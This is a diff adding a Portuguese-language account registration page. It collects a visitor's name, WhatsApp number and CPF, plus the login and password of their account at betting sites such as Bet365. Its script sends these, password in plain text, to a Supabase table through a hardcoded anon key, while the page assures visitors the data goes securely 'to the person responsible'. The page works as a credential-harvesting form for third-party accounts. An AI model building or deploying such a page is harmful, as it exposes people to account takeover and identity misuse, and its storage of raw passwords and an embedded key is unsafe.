@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cadastro de Conta</title>
+<style>
+  :root {
+    --green: #16a34a; --bg: #f0fdf4; --card: #ffffff;
+    --border: #d1fae5; --text: #111827; --muted: #6b7280;
+    --err: #dc2626; --radius: 12px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--bg); min-height: 100vh;
+    display: flex; align-items: flex-start; justify-content: center;
+    padding: 24px 16px 48px;
+  }
+  .wrapper { width: 100%; max-width: 480px; }
+  .header { text-align: center; margin-bottom: 28px; }
+  .logo {
+    width: 56px; height: 56px; background: var(--green); border-radius: 16px;
+    display: inline-flex; align-items: center; justify-content: center;
+    font-size: 28px; margin-bottom: 14px;
+  }
+  .header h1 { font-size: 22px; font-weight: 700; color: var(--text); }
+  .header p { font-size: 14px; color: var(--muted); margin-top: 6px; line-height: 1.5; }
+  .card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: var(--radius); padding: 24px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+  }
+  .section-title {
+    font-size: 11px; font-weight: 700; letter-spacing: .08em;
+    text-transform: uppercase; color: var(--green); margin: 0 0 16px;
+  }
+  .field { margin-bottom: 18px; }
+  .field label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
+  .field label .req { color: var(--err); margin-left: 2px; }
+  .field input, .field select {
+    width: 100%; padding: 11px 14px; border: 1.5px solid #e5e7eb; border-radius: 8px;
+    font-size: 15px; color: var(--text); background: #fafafa;
+    transition: border-color .15s; appearance: none; -webkit-appearance: none; outline: none;
+  }
+  .field select {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236b7280' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
+    background-repeat: no-repeat; background-position: right 14px center; padding-right: 36px;
+  }
+  .field input:focus, .field select:focus { border-color: var(--green); background: #fff; }
+  .field input.err, .field select.err { border-color: var(--err); }
+  .field .hint { font-size: 12px; color: var(--muted); margin-top: 5px; }
+  .pass-wrap { position: relative; }
+  .pass-wrap input { padding-right: 46px; }
+  .pass-toggle {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer; font-size: 16px;
+    color: var(--muted); padding: 4px; line-height: 1;
+  }
+  .divider { border: none; border-top: 1px solid var(--border); margin: 22px 0; }
+  .btn-submit {
+    width: 100%; padding: 15px; background: var(--green); color: #fff;
+    border: none; border-radius: 10px; font-size: 16px; font-weight: 700;
+    cursor: pointer; transition: background .15s, transform .1s; margin-top: 8px;
+  }
+  .btn-submit:hover { background: #15803d; }
+  .btn-submit:active { transform: scale(.98); }
+  .btn-submit:disabled { background: #9ca3af; cursor: not-allowed; }
+  .footer-note { text-align: center; font-size: 12px; color: var(--muted); margin-top: 18px; line-height: 1.6; }
+  .footer-note strong { color: var(--green); }
+  .overlay {
+    display: none; position: fixed; inset: 0; background: rgba(0,0,0,.45);
+    z-index: 100; align-items: center; justify-content: center; padding: 24px;
+  }
+  .overlay.open { display: flex; }
+  .modal {
+    background: #fff; border-radius: var(--radius); padding: 32px 28px;
+    max-width: 380px; width: 100%; text-align: center;
+    box-shadow: 0 8px 40px rgba(0,0,0,.18);
+  }
+  .modal .icon { font-size: 48px; margin-bottom: 14px; }
+  .modal h2 { font-size: 20px; color: var(--text); margin-bottom: 8px; }
+  .modal p { font-size: 14px; color: var(--muted); line-height: 1.6; }
+  .modal .btn-close {
+    margin-top: 22px; padding: 11px 28px; background: var(--green); color: #fff;
+    border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+  .error-banner {
+    display: none; background: #fef2f2; border: 1px solid #fecaca;
+    color: var(--err); border-radius: 8px; padding: 12px 14px;
+    font-size: 13px; margin-bottom: 16px;
+  }
+  .error-banner.show { display: block; }
+  .spinner {
+    display: inline-block; width: 18px; height: 18px;
+    border: 2px solid rgba(255,255,255,.3); border-top-color: #fff;
+    border-radius: 50%; animation: spin .7s linear infinite; margin-right: 8px;
+    vertical-align: middle;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="header">
+    <h1>Cadastro de Conta</h1>
+    <p>Preencha os dados da sua conta de apostas.<br>As informações serão enviadas de forma segura.</p>
+  </div>
+
+  <div class="card">
+    <div class="error-banner" id="err-banner"></div>
+
+    <div class="section-title">Seus dados</div>
+
+    <div class="field">
+      <label>Nome completo <span class="req">*</span></label>
+      <input id="f-nome" type="text" placeholder="Ex: João da Silva" autocomplete="name"/>
+    </div>
+
+    <div class="field">
+      <label>WhatsApp <span class="req">*</span></label>
+      <input id="f-wpp" type="tel" placeholder="(11) 99999-9999" inputmode="numeric" maxlength="16"/>
+      <div class="hint">DDD + número, sem espaços ou traços</div>
+    </div>
+
+    <div class="field">
+      <label>CPF</label>
+      <input id="f-cpf" type="text" placeholder="000.000.000-00" maxlength="14" inputmode="numeric"/>
+    </div>
+
+    <hr class="divider">
+
+    <div class="section-title">Dados da conta de apostas</div>
+
+    <div class="field">
+      <label>Casa de apostas <span class="req">*</span></label>
+      <select id="f-casa">
+        <option value="">Selecione a casa</option>
+        <option value="Superbet">Superbet</option>
+        <option value="Bet365">Bet365</option>
+        <option value="EstrelaBet">EstrelaBet</option>
+        <option value="Novibet">Novibet</option>
+        <option value="Casa Espelho">Casa Espelho</option>
+      </select>
+    </div>
+
+    <div class="field">
+      <label>Login / E-mail <span class="req">*</span></label>
+      <input id="f-login" type="email" placeholder="seu@email.com" autocomplete="email" inputmode="email"/>
+    </div>
+
+    <div class="field">
+      <label>Senha <span class="req">*</span></label>
+      <div class="pass-wrap">
+        <input id="f-senha" type="password" placeholder="••••••••" autocomplete="current-password"/>
+        <button type="button" class="pass-toggle" onclick="togglePass()" title="Mostrar/ocultar">👁</button>
+      </div>
+    </div>
+
+    <button class="btn-submit" id="btn-enviar" onclick="enviar()">
+      Enviar cadastro
+    </button>
+  </div>
+
+  <p class="footer-note">
+    🔒 Seus dados são enviados <strong>com segurança</strong><br>
+    diretamente para o responsável.
+  </p>
+</div>
+
+<div class="overlay" id="modal-ok">
+  <div class="modal">
+    <div class="icon">✅</div>
+    <h2>Cadastro enviado!</h2>
+    <p>Seus dados foram registrados com sucesso.<br>Em breve entraremos em contato pelo WhatsApp.</p>
+    <button class="btn-close" onclick="document.getElementById('modal-ok').classList.remove('open')">Fechar</button>
+  </div>
+</div>
+
+<script>
+  const SUPABASE_URL      = 'https://vxthbjrdtwlnzzadmrmy.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4dGhianJkdHdsbnp6YWRtcm15Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAzMzU1NzEsImV4cCI6MjA5NTkxMTU3MX0.UGdYBmNA6_O7YQVvgGbq2CrWPHnJdGLsflKNR3b65Go';
+
+  function togglePass() {
+    const inp = document.getElementById('f-senha');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+  }
+
+  document.getElementById('f-wpp').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '');
+    if (v.length > 2) v = '(' + v.slice(0,2) + ') ' + v.slice(2);
+    if (v.length > 10) v = v.slice(0,10) + '-' + v.slice(10);
+    this.value = v.slice(0, 16);
+  });
+
+  document.getElementById('f-cpf').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '');
+    v = v.replace(/(\d{3})(\d)/, '$1.$2')
+         .replace(/(\d{3})(\d)/, '$1.$2')
+         .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    this.value = v.slice(0, 14);
+  });
+
+  function mostrarErro(msg) {
+    const b = document.getElementById('err-banner');
+    b.textContent = msg;
+    b.classList.add('show');
+    b.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  function validar() {
+    document.getElementById('err-banner').classList.remove('show');
+    const campos = [
+      { id: 'f-nome',  check: v => v.trim().length >= 2, label: 'nome' },
+      { id: 'f-wpp',   check: v => v.replace(/\D/g,'').length >= 10, label: 'WhatsApp' },
+      { id: 'f-casa',  check: v => v !== '', label: 'casa de apostas' },
+      { id: 'f-login', check: v => v.trim().length >= 4, label: 'login' },
+      { id: 'f-senha', check: v => v.length >= 1, label: 'senha' },
+    ];
+    for (const { id, check, label } of campos) {
+      const el = document.getElementById(id);
+      if (!check(el.value)) {
+        el.classList.add('err');
+        el.addEventListener('input', () => el.classList.remove('err'), { once: true });
+        mostrarErro(`Preencha o campo: ${label}`);
+        return false;
+      }
+    }
+    return true;
+  }
+
+  async function enviar() {
+    if (!validar()) return;
+
+    const btn = document.getElementById('btn-enviar');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>Enviando...';
+
+    const payload = {
+      nome:   document.getElementById('f-nome').value.trim(),
+      wpp:    document.getElementById('f-wpp').value.replace(/\D/g,''),
+      cpf:    document.getElementById('f-cpf').value.trim() || null,
+      casa:   document.getElementById('f-casa').value,
+      login:  document.getElementById('f-login').value.trim(),
+      senha:  document.getElementById('f-senha').value,
+      status: 'aguardando',
+    };
+
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 10000);
+
+    try {
+      const r = await fetch(`${SUPABASE_URL}/rest/v1/cadastros`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': SUPABASE_ANON_KEY,
+          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+          'Prefer': 'return=minimal',
+        },
+        body: JSON.stringify(payload),
+        signal: controller.signal,
+      });
+      clearTimeout(timeout);
+
+      if (!r.ok) {
+        const txt = await r.text().catch(() => r.status);
+        throw new Error(String(txt));
+      }
+
+      document.getElementById('modal-ok').classList.add('open');
+      ['f-nome','f-wpp','f-cpf','f-login','f-senha'].forEach(id => {
+        document.getElementById(id).value = '';
+      });
+      document.getElementById('f-casa').value = '';
+
+    } catch (err) {
+      clearTimeout(timeout);
+      if (err.name === 'AbortError') {
+        mostrarErro('Tempo esgotado. Tente novamente em instantes.');
+      } else {
+        mostrarErro('Erro ao enviar. Verifique sua conexão e tente novamente.');
+      }
+      console.error(err);
+    } finally {
+      btn.disabled = false;
+      btn.innerHTML = 'Enviar cadastro';
+    }
+  }
+</script>
+
+</body>
+</html>
